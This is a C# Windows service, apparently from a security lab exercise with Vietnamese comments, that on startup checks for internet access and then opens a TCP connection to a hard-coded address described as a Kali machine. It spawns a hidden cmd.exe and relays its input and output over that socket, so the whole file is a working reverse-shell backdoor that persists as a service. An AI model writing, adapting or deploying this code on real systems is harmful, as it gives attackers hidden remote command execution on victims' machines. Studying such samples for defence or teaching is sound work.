using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Net;
using System.Net.Sockets;
namespace BT3
{
    public partial class Service1 : ServiceBase
    {
        static StreamWriter streamWriter;
        Timer timer = new Timer();
        public Service1()
        {
            InitializeComponent();
        }
        //Start service 
        protected override void OnStart(string[] args)
        {
            WriteToFile("Service is started at " + DateTime.Now);
            //timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            //timer.Enabled = true;
            if (CheckForInternetConnection() == true) // Check connect Internet               
            {
                WriteToFile("Co Ket Noi Internet 11 " + DateTime.Now);  // connect Internet
                  //reverse shell
                using (TcpClient client = new TcpClient("192.168.111.179", 443)) //ip máy kali
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);

                            StringBuilder strInput = new StringBuilder();

                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);                          
                            p.Start();
                            p.BeginOutputReadLine();

                            while (true)
                            {
                                strInput.Append(rdr.ReadLine());
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                    }
                }
            }
            else
            {
                WriteToFile("Khong Ket Noi Internet " + DateTime.Now);  //don't connect Internet
            }
        }
        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            ServiceController service = new ServiceController("YourServiceName");
            service.Start();

        }
        //Stop service 

        protected override void OnStop()
        {

            WriteToFile("Service is stopped at " + DateTime.Now);
            //timer.Elapsed += new ElapsedEventHandler(OffElapsedTime);
            //timer.Enabled = true;
        }
        private void OffElapsedTime(object source, ElapsedEventArgs e)
        {
            ServiceController service = new ServiceController("YourServiceName");
            service.Stop();

        }
        //hàm Check connect Internet 
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;               
            }
            catch
            {
                return false;
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception e) { }
            }
        }
        // Tạo file log
        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to. 
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }

    }
}
